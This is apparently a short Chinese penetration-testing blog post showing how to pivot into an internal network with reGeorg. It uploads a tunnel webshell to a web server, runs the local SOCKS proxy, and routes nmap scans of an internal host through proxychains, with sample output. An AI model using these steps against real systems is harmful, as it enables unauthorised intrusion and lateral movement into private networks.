---
title: "reGeorg 内网穿透"
date: 2018-02-22T00:00:00+08:00
draft: false
tags: ['windows','linux']
categories: ['内网渗透']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

前面介绍了 ew 这款神器 不过没有一台 vps 就不能实现转发

reGeorg 是 reDuh 的升级版 使用的是 socks5 协议

<!--more-->

首先将 tunnel 上传至服务器

本地运行

`./reGeorgSocksProxy.py -u http://www.baidu.com/tunnel.php -p 1080`

```
$ ./reGeorgSocksProxy.py -u http://www.baidu.com/tunnel.aspx -p 1080                                                                                                                                   
                     _____
  _____   ______  __|___  |__  ______  _____  _____   ______
 |     | |   ___||   ___|    ||   ___|/     \|     | |   ___|
 |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  |
 |__|\__\|______||______|  __||______|\_____/|__|\__\|______|
                    |_____|
                    ... every office needs a tool like Georg

  willem@sensepost.com / @_w_m__
  sam@sensepost.com / @trowalts
  etienne@sensepost.com / @kamp_staaldraad

[INFO]  Log Level set to [INFO]
[INFO]  Starting socks server [127.0.0.1:1080], tunnel at [http://www.baidu.com/tunnel.aspx]
[INFO]  Checking if Georg is ready
[INFO]  Georg says, 'All seems fine'
```

配置 proxychains

`sudo vim /etc/proxychains.conf`

在 ProxyList 下增加代理

```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 1080
```

通过代理运行程序

`proxychains cmd`

例如

```
$ proxychains nmap -p 80,1433,3306 172.16.2.10                                                   

ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 7.40 ( https://nmap.org ) at 2018-02-22 11:34 CST
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.2.10:80-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.2.10:3306-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.2.10:80-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.2.10:1433-<><>-OK
Nmap scan report for 172.16.2.10
Host is up (0.49s latency).
PORT     STATE SERVICE
80/tcp   open  http
1433/tcp open  ms-sql-s
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 1.87 seconds
```

或者开一个 bash

```
$ proxychains bash                                                                               

ProxyChains-3.1 (http://proxychains.sf.net)
$ nmap -sP 172.16.2.10

Starting Nmap 7.40 ( https://nmap.org ) at 2018-02-22 11:35 CST
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.2.10:80-<><>-OK
Nmap scan report for 172.16.2.10
Host is up (0.31s latency).
Nmap done: 1 IP address (1 host up) scanned in 0.34 seconds
```